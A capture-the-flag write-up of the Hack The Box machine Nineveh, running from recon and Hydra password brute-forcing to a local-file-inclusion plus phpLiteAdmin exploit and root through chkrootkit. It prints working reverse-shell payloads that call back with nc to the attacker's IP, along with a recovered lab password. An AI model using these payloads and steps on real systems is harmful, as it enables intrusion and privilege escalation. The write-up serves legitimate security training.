# Nineveh - 10.10.10.43
## Recon
### Nmap and stuff
You know the drill by now, ``nmap -sV -sS -v 10.10.10.43``.
```
Nmap scan report for 10.10.10.43
Host is up (0.17s latency).
Not shown: 998 filtered ports
PORT	STATE SERVICE  VERSION
80/tcp  open  http 	Apache httpd 2.4.18 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
```
The http one displays default apache page while SSL has a static picture, so we can assume that the routing is done differently depending on the protocol. Thus, dirb both of these.

```
dirb http://10.10.10.43/ /usr/share/wordlists/dirb/common.txt
dirb https://10.10.10.43/ /usr/share/wordlists/dirb/common.txt
```
Findings:
```
==> DIRECTORY: http://10.10.10.43/department/
...
==> DIRECTORY: https://10.10.10.43/db/
```
## Department panel

First thing is a nice login screen. In the beginning it's good to try some basic SQLi in Burp's Repeater, then send the request to sqlmap to run in background. For now, let's try other stuff.

### THC Hydra

Intercept the request in Burp to get the cookie and craft this hydra command. Use ``admin`` as a username, since it was discovered that it is a valid user.
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password:H=Cookie: PHPSESSID=gbva847ji81osirul39t7vouj2" -v
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-06 23:23:53
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.43:80//department/login.php:username=^USER^&password=^PASS^:Invalid Password:H=Cookie: PHPSESSID=gbva847ji81osirul39t7vouj2
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 817.00 tries/min, 817 tries in 00:01h, 14343582 to do in 292:37h, 16 active
[STATUS] 827.67 tries/min, 2483 tries in 00:03h, 14341916 to do in 288:49h, 16 active
[VERBOSE] Page redirected to http://10.10.10.43/department/manage.php
```
### Local File inclusion

Manage page appears to be under construction containing no info whatsoever, except a note for a dev.
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt
```HTML
        <pre>
        	<li>Have you fixed the login page yet! hardcoded username and password is really bad idea!</li>
        	<li>check your serect folder to get in! figure it out! this is your challenge</li>
        	<li>Improve the db interface.
          	<small>~amrois</small>
        	</pre>
      	</pre>
```
Interesting url, eh? Although trying LFI with ``../../../etc/shadow`` or anything else gives no result.
```HTML
<pre>No Note is selected.
```
BUUUT, trying http://10.10.10.43/department/manage.php?notes=secret/ninevehNotes.txt gives something different.
```HTML
<pre>
<pre><br />
<b>Warning</b>:  include(secret/ninevehNotes.txt): failed to open stream: No such file or directory in <b>/var/www/html/department/manage.php</b> on line <b>31</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'secret/ninevehNotes.txt' for inclusion (include_path='.:/usr/share/php') in <b>/var/www/html/department/manage.php</b> on line <b>31</b><br />
</pre>
</pre>
```
So there must some sort of filter that blocks local file inclusion, but apparently name ``ninevehNotes`` is whitelisted, so it tries to pull it up. This info will be very useful on a different stage. Meanwhile, let's check on ssl website.

## Database
### THC Hydra again
Same procedure, just don't forget to change ``https-post-form`` and force SSL.
```
root@kingpin:~# hydra -l adm -P /usr/share/wordlists/rockyou.txt.gz 10.10.10.43 -v https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password:H=Cookie: PHPSESSID=gbva847ji81osirul39t7vouj2;" -ssl
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-06 14:01:53
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443//db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password:H=Cookie: PHPSESSID=gbva847ji81osirul39t7vouj2;
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active
[STATUS] 238.67 tries/min, 716 tries in 00:03h, 14343683 to do in 1001:40h, 16 active
[443][http-post-form] host: 10.10.10.43   login: adm   password: password123
```
### phpLiteAdmin
The most glaring thing on the page would be the version of the db: phpLiteAdmin 1.9. And there is a [sweet CVE](https://www.exploit-db.com/exploits/24044/) for it. Basically, the vuln is that it is possible to force PHP file extension to a db file.

There is one difference, however. According to CVE:
>The script will store the sqlite database in the same directory as phpliteadmin.php.

Not the case here. The default path to the db is ``/var/tmp``. Moving the file to a publicly accessible location does not work, since www-data is not privileged to write files to those directories. And that is why the previous step comes in handy.

### Malicious DB

 - Create a database named ninevehNotes.php
 - Make a table with one text column and the default value of your payload.

```sql
CREATE TABLE '1337' ('1' TEXT default '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.93 1337 >/tmp/f"); ?>')
```

- Set up nc listener (``nc -lnvp 1337``)
- Make a request to your DB

```
GET /department/manage.php?notes=/var/tmp/ninevehNotes.php10.10 HTTP/1.1
Host: 10.10.10.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://10.10.10.43/department/login.php
Cookie: PHPSESSID=gbva847ji81osirul39t7vouj2
```

## First shell

Now, remember the "secret folder" mentioned in the note? We have an access to the server, so we might as well find it.

It turns out to be located on ssl site under ``secure_notes`` and contains only one picture.
```
wget https://10.10.10.43/secure_notes/nineveh.png --no-check-certificate
--2017-12-07 09:41:08--  https://10.10.10.43/secure_notes/nineveh.png
HTTP request sent, awaiting response... 200 OK
Length: 2891984 (2.8M) [image/png]
Saving to: ‘nineveh.png’

nineveh.png                         	100%[=============================================================================>]   2.76M  1.30MB/s	in 2.1s    
```
The end of file is interesting. Obtained [SSH private key](https://github.com/leolashkevych/CTF/blob/master/Hackthebox.eu/Machines/Nineveh%20-%2010.10.10.43/key.ssh) for amrois.
```
hexdump -C nineveh.png
...
002c05d0  00 75 73 74 61 72 20 20  00 77 77 77 2d 64 61 74  |.ustar  .www-dat|
002c05e0  61 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |a...............|
002c05f0  00 00 00 00 00 00 00 00  00 77 77 77 2d 64 61 74  |.........www-dat|
002c0600  61 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |a...............|
002c0610  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
002c06d0  73 73 68 2d 72 73 61 20  41 41 41 41 42 33 4e 7a  |ssh-rsa AAAAB3Nz|
002c06e0  61 43 31 79 63 32 45 41  41 41 41 44 41 51 41 42  |aC1yc2EAAAADAQAB|
002c06f0  41 41 41 42 41 51 43 75  4c 30 52 51 50 74 76 43  |AAABAQCuL0RQPtvC|
002c0700  70 75 59 53 77 53 6b 68  35 4f 76 59 6f 59 2f 2f  |puYSwSkh5OvYoY//|
002c0710  43 54 78 67 42 48 52 6e  69 61 61 38 63 30 6e 64  |CTxgBHRniaa8c0nd|
002c0720  52 2b 77 43 47 6b 67 66  33 38 48 50 56 70 73 56  |R+wCGkgf38HPVpsV|
002c0730  75 75 33 58 71 38 66 72  2b 4e 33 79 62 53 36 75  |uu3Xq8fr+N3ybS6u|
002c0740  44 38 53 62 74 33 38 55  6d 64 79 6b 2b 49 67 66  |D8Sbt38Umdyk+Igf|
002c0750  7a 55 6c 73 6e 53 6e 4a  4d 47 38 67 41 59 30 72  |zUlsnSnJMG8gAY0r|
002c0760  73 2b 46 70 42 64 51 39  31 50 33 4c 54 45 51 51  |s+FpBdQ91P3LTEQQ|
002c0770  66 52 71 6c 73 6d 53 36  53 63 2f 67 55 66 6c 6d  |fRqlsmS6Sc/gUflm|
```
## amrois@nineveh.htb

Before we celebrate this awesome finding, recall nmap results, port 22 is closed. SSH might be running on a different port or it is just filtered. Check the listeners while still on www-data shell.
```
$ netstat -plnt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address       	Foreign Address     	State   	PID/Program name
tcp    	0  	0 0.0.0.0:80          	0.0.0.0:*           	LISTEN  	-          	 
tcp    	0  	0 0.0.0.0:22          	0.0.0.0:*           	LISTEN  	-          	 
tcp    	0  	0 0.0.0.0:443         	0.0.0.0:*           	LISTEN  	-          	 
tcp6   	0  	0 :::22               	:::*                	LISTEN  	-
```

Okay, let's connect from localhost. The simplest way to transfer the key (at least from what I know) is via ``python -m SimpleHTTPServer *port*`` and then just download it with ``wget``

```
ssh -i ssh.key amrois@127.0.0.1
Pseudo-terminal will not be allocated because stdin is not a terminal.
Could not create directory '/var/www/.ssh'.
Host key verification failed.
```
The ``nc`` shell we have is non-interactive, upgrade it with pty so it is cool enough to do ssh.
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@nineveh:/var/tmp$ ssh -i ssh.key amrois@127.0.0.1
ssh -i ssh.key amrois@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management: 	https://landscape.canonical.com
 * Support:    	https://ubuntu.com/advantage

133 packages can be updated.
66 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$
```
## RootTheBox

It's a good idea to start the privesc with basic enum such as:
- Identifying the groups
- Cronjobs
- Searching for writable files
  - ``find / -writable 2>/dev/null``
- Searching for suid
  - ``find / -perm -4000 2>/dev/null``
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)

But today none of that worked. So the last thing would be to poke around manually and look for weird stuff. Today the weird stuff was in ``/reports``
```
cat report-17-12-07:13:40.txt
ROOTDIR is `/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
Checking `crontab'... not infected
Checking `killall'... not infected
Checking `ldsopreload'... can't exec ./strings-static, not tested
Checking `login'... not infected
Checking `ls'... not infected
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while...
/lib/modules/4.4.0-62-generic/vdso/.build-id
/lib/modules/4.4.0-62-generic/vdso/.build-id
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
Searching for RK17 files and dirs... nothing found
Searching for Ducoci rootkit... nothing found
Searching for Adore Worm... nothing found
Searching for ShitC Worm... nothing found
Searching for Omega Worm... nothing found
Searching for Sadmind/IIS Worm... nothing found
Searching for MonKit... nothing found
Searching for Showtee... nothing found
Searching for OpticKit... nothing found
Searching for T.R.K... nothing found
Searching for Mithra... nothing found
Searching for LOC rootkit... nothing found
Searching for Romanian rootkit... nothing found
Searching for Suckit rootkit... Warning: /sbin/init INFECTED
Searching for Volc rootkit... nothing found
Searching for Gold2 rootkit... nothing found
Searching for TC2 Worm default files and dirs... nothing found
Searching for Anonoying rootkit default files and dirs... nothing found
Searching for ZK rootkit default files and dirs... nothing found
Searching for ShKit rootkit default files and dirs... nothing found
Searching for AjaKit rootkit default files and dirs... nothing found
Searching for zaRwT rootkit default files and dirs... nothing found
Searching for Madalin rootkit default files... nothing found
Searching for Fu rootkit default files... nothing found
Searching for ESRK rootkit default files... nothing found
Searching for rootedoor... nothing found
Searching for ENYELKM rootkit default files... nothing found
Searching for common ssh-scanners default files... nothing found
Searching for suspect PHP files...
/var/tmp/ninevehNotes.php
/var/tmp/a.php

Searching for anomalies in shell history files... Warning: `//root/.bash_history' file size is zero
Checking `asp'... not infected
...
```
A quick Google search will let you know that the report was created by Chkrootkit. An even quicker Google search will get ya this [lovely CVE](https://www.exploit-db.com/exploits/33899/).

Basically, if you put an executable in ``/tmp/update`` with non-root owner, Chkrootkit will run it as root during at the moment of execution.

- set up nc listener to catch a root shell
  - ``nc -nlvp 6969``
- create the update file with a reverse shell
  - ``amrois@nineveh:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.93``
  ``amrois@nineveh:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.93``
- wait for a minute or so

```
root@kingpin:~/Desktop# nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.15.93] from (UNKNOWN) [10.10.10.43] 49754
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
